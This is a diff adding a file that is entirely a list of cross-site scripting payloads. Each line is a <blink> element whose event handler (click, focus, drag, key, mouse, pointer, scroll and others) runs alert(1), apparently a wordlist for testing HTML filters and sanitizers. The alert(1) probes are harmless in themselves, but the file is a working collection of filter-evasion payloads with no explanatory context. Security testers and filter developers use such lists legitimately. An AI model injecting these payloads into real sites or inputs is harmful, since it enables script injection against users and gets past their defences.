@@ -1,0 +1,38 @@
+<blink contenteditable onbeforeinput=alert(1)>test
+<blink draggable="true" ondrag="alert(1)" style=display:block>test</blink>
+<blink draggable="true" ondragend="alert(1)" style=display:block>test</blink>
+<blink draggable="true" ondragenter="alert(1)" style=display:block>test</blink>
+<blink draggable="true" ondragleave="alert(1)" style=display:block>test</blink>
+<blink draggable="true" ondragstart="alert(1)" style=display:block>test</blink>
+<blink id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></blink>
+<blink id=x tabindex=1 onfocus=alert(1)></blink>
+<blink id=x tabindex=1 onfocusin=alert(1)></blink>
+<blink onafterscriptexecute=alert(1)><script>1</script>
+<blink onbeforescriptexecute=alert(1)><script>1</script>
+<blink onblur=alert(1) id=x tabindex=1 style=display:block>test</blink><input value=clickme>
+<blink onclick="alert(1)" style=display:block>test</blink>
+<blink oncontextmenu="alert(1)" style=display:block>test</blink>
+<blink oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<blink oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<blink ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</blink>
+<blink onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</blink><input value=clickme>
+<blink onkeydown="alert(1)" contenteditable style=display:block>test</blink>
+<blink onkeypress="alert(1)" contenteditable style=display:block>test</blink>
+<blink onkeyup="alert(1)" contenteditable style=display:block>test</blink>
+<blink onmousedown="alert(1)" style=display:block>test</blink>
+<blink onmouseenter="alert(1)" style=display:block>test</blink>
+<blink onmouseleave="alert(1)" style=display:block>test</blink>
+<blink onmousemove="alert(1)" style=display:block>test</blink>
+<blink onmouseout="alert(1)" style=display:block>test</blink>
+<blink onmouseover="alert(1)" style=display:block>test</blink>
+<blink onmouseup="alert(1)" style=display:block>test</blink>
+<blink onmousewheel=alert(1) style=display:block>requires scrolling
+<blink onpointerdown=alert(1) style=display:block>XSS</blink>
+<blink onpointerenter=alert(1) style=display:block>XSS</blink>
+<blink onpointerleave=alert(1) style=display:block>XSS</blink>
+<blink onpointermove=alert(1) style=display:block>XSS</blink>
+<blink onpointerout=alert(1) style=display:block>XSS</blink>
+<blink onpointerover=alert(1) style=display:block>XSS</blink>
+<blink onpointerrawupdate=alert(1) style=display:block>XSS</blink>
+<blink onpointerup=alert(1) style=display:block>XSS</blink>
+<blink onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></blink>
